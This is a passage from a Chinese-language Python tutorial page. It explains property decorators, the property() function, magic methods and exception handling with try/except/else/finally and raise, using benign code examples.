class="title function_">age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__age</span><br><span class="line"></span><br><span class="line"><span class="meta">    @age.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">age</span>(<span class="params">self, age</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(age, <span class="built_in">int</span>):</span><br><span class="line">            self.__age = age</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="meta">    @age.deleter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;删除年龄数据！&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(obj.age)</span><br><span class="line">obj.age = <span class="number">19</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;obj.age:  &quot;</span>, obj.age)</span><br><span class="line"><span class="keyword">del</span> obj.age</span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">打印结果：</span><br><span class="line"><span class="number">18</span></span><br><span class="line">obj.age:   <span class="number">19</span></span><br><span class="line">删除年龄数据！</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line">a = obj.age    <span class="comment"># 获取值</span></span><br><span class="line">obj.age = <span class="number">19</span>    <span class="comment"># 重新赋值</span></span><br><span class="line"><span class="keyword">del</span> obj.age     <span class="comment"># 删除属性</span></span><br></pre></td></tr></table></figure><p>将一个方法伪装成为属性后，就不再使用圆括号的调用方式了。而是类似变量的赋值、获取和删除方法了。当然，每个动作内部的代码细节还是需要你自己根据需求去实现的。</p><p>那么如何将一个普通的方法转换为一个“伪装”的属性呢？</p><ul><li>首先，在普通方法的基础上添加<code>@property</code>装饰器，例如上面的age()方法。这相当于一个get方法，用于获取值,决定类似<code>&quot;result = obj.age&quot;</code>执行什么代码。该方法仅有一个self参数。</li><li>写一个同名的方法，添加<code>@xxx.setter</code>装饰器（xxx表示和上面方法一样的名字），比如例子中的第二个方法。这相当于编写了一个set方法，提供赋值功能，决定类似<code>&quot;obj.age = ....&quot;</code>的语句执行什么代码。</li><li>再写一个同名的方法，并添加<code>@xxx.delete</code>装饰器，比如例子中的第三个方法。用于删除功能，决定<code>&quot;del obj.age &quot;</code>这样的语句具体执行什么代码。</li></ul><p>简而言之，就是分别将三个方法定义为对同一个属性的获取、修改和删除。还可以定义只读属性，也就是只定义getter方法，不定义setter方法就是一个只读属性。</p><h3 id="property-函数">property()函数</h3><p>除了使用装饰器的方式将一个方法伪装成属性外，Python内置的builtins模块中的property()函数，为我们提供了第二种设置类属性的手段。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_age</span>(<span class="params">self, age</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(age, <span class="built_in">int</span>):</span><br><span class="line">            self.__age = age</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">del_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;删除年龄数据！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 核心在这句</span></span><br><span class="line">    age = <span class="built_in">property</span>(get_age, set_age, del_age, <span class="string">&quot;年龄&quot;</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(obj.age)</span><br><span class="line">obj.age = <span class="number">19</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;obj.age:  &quot;</span>, obj.age)</span><br><span class="line"><span class="keyword">del</span> obj.age</span><br></pre></td></tr></table></figure><p>通过语句<code>age = property(get_age, set_age, del_age, &quot;年龄&quot;)</code>将一个方法伪装成为属性。其效果和装饰器的方法是一样的。</p><p>property()函数的参数：</p><ul><li>第一个参数是方法名，调用 <code>实例.属性</code> 时自动执行的方法</li><li>第二个参数是方法名，调用 <code>实例.属性 ＝ XXX</code>时自动执行的方法</li><li>第三个参数是方法名，调用 <code>del 实例.属性</code> 时自动执行的方法</li><li>第四个参数是字符串，调用 <code>实例.属性.__doc__</code>时的描述信息。</li></ul><p><strong>特殊成员和魔法方法</strong><br>Python中有大量类似__doc__这种以双下划线开头和结尾的特殊成员及“魔法方法”，它们有着非常重要的地位和作用，也是Python语言独具特色的语法之一！</p><p>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__init__ :      构造函数，在生成对象时调用</span><br><span class="line">__del__ :       析构函数，释放对象时使用</span><br><span class="line">__repr__ :      打印，转换</span><br><span class="line">__setitem__ :   按照索引赋值</span><br><span class="line">__getitem__:    按照索引获取值</span><br><span class="line">__len__:        获得长度</span><br><span class="line">__cmp__:        比较运算</span><br><span class="line">__call__:       调用</span><br><span class="line">__add__:        加运算</span><br><span class="line">__sub__:        减运算</span><br><span class="line">__mul__:        乘运算</span><br><span class="line">__div__:        除运算</span><br><span class="line">__mod__:        求余运算</span><br><span class="line">__pow__:        幂</span><br></pre></td></tr></table></figure><p>需要注意的是，这些成员里面有些是方法，调用时要加括号，有些是属性，调用时不需要加括号（废话！）。<br>具体用法请查看<a href="https://www.liujiangblog.com/course/python/47">python教程</a></p><h3 id="异常处理">异常处理</h3><p>在程序运行过程中，总会遇到各种各样的问题和错误。有些错误是我们编写代码时自己造成的，比如语法错误、调用错误，甚至逻辑错误。还有一些错误，则是不可预料的错误，但是完全有可能发生的，比如文件不存在、磁盘空间不足、网络堵塞、系统错误等等。这些导致程序在运行过程中出现异常中断和退出的错误，我们统称为异常。大多数的异常都不会被程序处理，而是以错误信息的形式展现出来。</p><p>异常有很多种类型，Python内置了几十种常见的异常，就在builtins模块内，无需特别导入，直接就可使用。需要注意的是，所有的异常都是异常类，首字母是大写的！</p><p>在发生异常的时候，Python会打印出异常信息，信息的前面部分显示了异常发生的上下文环境，并以调用栈的形式显示具体信息。异常类型作为信息的一部分也会被打印出来，例如ZeroDivisionError，NameError 和 TypeError。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> * (<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> ?</span><br><span class="line">ZeroDivisionError: division by zero</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span> + spam*<span class="number">3</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> ?</span><br><span class="line">NameError: name <span class="string">&#x27;spam&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;2&#x27;</span> + <span class="number">2</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> ?</span><br><span class="line">TypeError: Can<span class="string">&#x27;t convert &#x27;</span><span class="built_in">int</span><span class="string">&#x27; object to str implicitly</span></span><br></pre></td></tr></table></figure><p>为了保证程序的正常运行，提高程序健壮性和可用性。我们应当尽量考虑全面，将可能出现的异常进行处理，而不是留在那里，任由其发生。</p><p>Python内置了一套try…except…finally（else）…的异常处理机制，来帮助我们进行异常处理。其基本语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    pass</span><br><span class="line">except Exception as ex:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p><em>注：在Python3中，原Python2的<code>except Exception , ex</code>的别名方法已经不能使用，逗号被认为是两种异常的分隔符，而不是取别名。</em></p><p>Python的异常机制具有嵌套处理的能力，比如下面的函数f3()调用f2()，f2()调用f1()，虽然是在f1()出错了，但只需要在f3()进行异常捕获，不需要每一层都捕获异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>/<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>():</span><br><span class="line">    f1()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f3</span>():</span><br><span class="line">    f2()</span><br><span class="line"></span><br><span class="line">f3()</span><br><span class="line">------------------------</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">10</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    f3()</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">8</span>, <span class="keyword">in</span> f3</span><br><span class="line">    f2()</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> f2</span><br><span class="line">    f1()</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">2</span>, <span class="keyword">in</span> f1</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>/<span class="number">0</span></span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p>仅仅需要在调用f3()函数的时候捕获异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>/<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>():</span><br><span class="line">    f1()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f3</span>():</span><br><span class="line">    f2()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f3()</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p><strong><code>try…except…</code>语句处理异常的工作机制如下：</strong></p><ul><li>首先，执行try子句（在关键字try和关键字except之间的语句）</li><li>如果没有异常发生，忽略except子句，try子句执行后结束。</li><li>如果在执行try子句的过程中发生了异常，那么try子句余下的部分将被忽略。如果异常的类型和 except 之后的名称相符，那么对应的except子句将被执行。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生异常之前的语句正常执行&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生异常之后的语句不会被执行&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------</span></span><br><span class="line">结果：</span><br><span class="line">发生异常之前的语句正常执行</span><br><span class="line">division by zero</span><br></pre></td></tr></table></figure><ul><li>如果程序发生的异常不在你的捕获列表中，那么依然会抛出别的异常。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 未捕获到异常，程序直接报错</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">int</span>(s1)</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> ex:    <span class="comment"># 本例为非法值异常，而你只捕获索引异常</span></span><br><span class="line">    <span class="built_in">print</span>(ex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">int</span>(s1)</span><br><span class="line">ValueError: invalid literal <span class="keyword">for</span> <span class="built_in">int</span>() <span class="keyword">with</span> base <span class="number">10</span>: <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>如果一个异常没有与任何的except匹配，那么这个异常将会传递给上层的try中。也就是前面说的嵌套处理能力。直到程序最顶端如果还没有被捕获，那么将弹出异常。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发生异常之前的语句正常执行&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发生异常之后的语句不会被执行&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;里层没有抓好，只能辛苦我外层了&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>可能包含多个except子句，分别来处理不同的特定的异常。但最多只有一个分支会被执行。所以except子句有排序先后问题，进了一条巷子就不会进别的巷子。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生异常之前的语句正常执行&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生异常之后的语句不会被执行&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> NameError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是第一个抓取到除零异常的&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> (ValueError,ZeroDivisionError) <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是备胎&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------</span></span><br><span class="line">发生异常之前的语句正常执行</span><br><span class="line">我是第一个抓取到除零异常的</span><br></pre></td></tr></table></figure><ul><li>处理程序将只针对对应的try子句中的异常进行处理，不会处理其他try语句中的异常。</li><li>一个except子句可以同时处理多个异常，这些异常将被放在一个括号里成为一个元组。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span> (RuntimeError, TypeError, NameError):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li>最后一个except子句可以忽略异常的名称，它将被当作通配符使用，也就是说匹配所有异常。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Unexpected error:&quot;</span>, sys.exc_info()[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>看一个综合性的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;myfile.txt&#x27;</span>)</span><br><span class="line">    s = f.readline()</span><br><span class="line">    i = <span class="built_in">int</span>(s.strip())</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> err:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;OS error: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(err))</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Could not convert data to an integer.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Unexpected error:&quot;</span>, sys.exc_info()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p><strong>通用异常：Exception</strong></p><p>在Python的异常中，有一个通用异常：<code>Exception</code>，它可以捕获任意异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">int</span>(s1)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;错误&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么既然有这个什么都能管的异常，其他诸如OSError、ValueError的异常是不是就可以不需要了？当然不是！很多时候程序只会弹出那么几个异常，没有必要针对所有的异常进行捕获，那样的效率会很低。另外，根据不同的异常种类，制定不同的处理措施，用于准确判断错误类型，存储错误日志，都是非常有必要甚至强制的。</p><h3 id="finally和else子句">finally和else子句</h3><p><code>try except</code>语法还有一个可选的else子句，如果使用这个子句，那么必须放在所有的except子句之后。这个子句将在try子句没有发生任何异常的时候执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = <span class="built_in">open</span>(arg, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;cannot open&#x27;</span>, arg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(arg, <span class="string">&#x27;has&#x27;</span>, <span class="built_in">len</span>(f.readlines()), <span class="string">&#x27;lines&#x27;</span>)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>同样的，还有一个可选的finally子句。无论try执行情况和except异常触发情况，finally子句都会被执行！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;try...&#x27;</span>)</span><br><span class="line">    r = <span class="number">10</span> / <span class="built_in">int</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>, r)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ValueError:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finally...&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;END&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么，当else和finally同时存在时：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;else&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finally&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">finally</span></span><br></pre></td></tr></table></figure><p>如果有异常发生：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;else&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finally&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">finally</span></span><br></pre></td></tr></table></figure><h3 id="主动抛出异常：raise">主动抛出异常：raise</h3><p>很多时候，我们需要主动抛出一个异常。Python内置了一个关键字<code>raise</code>，可以主动触发异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">raise</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#0&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line">RuntimeError: No active exception to reraise</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">raise</span> NameError(<span class="string">&quot;kkk&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#1&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">raise</span> NameError(<span class="string">&quot;kkk&quot;</span>)</span><br><span class="line">NameError: kkk</span><br></pre></td></tr></table></figure><p>raise唯一的一个参数指定了要被抛出的异常的实例，如果什么参数都不给，那么会默认抛出当前异常。</p><p>可能有同学会问，为什么要自己主动抛出异常？不嫌多事么？因为有的时候，你需要记录错误信息，然后将异常继续往上层传递，让上层去处理异常，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;记录异常日志： &quot;</span>, ex)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;但是我自己无法处理，只能继续抛出，看看上层能否处理（甩锅）&quot;</span>)</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p>有时候，你需要主动弹出异常，作为警告或特殊处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sex = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input a number: &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> sex == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是个男人！&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> sex == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span 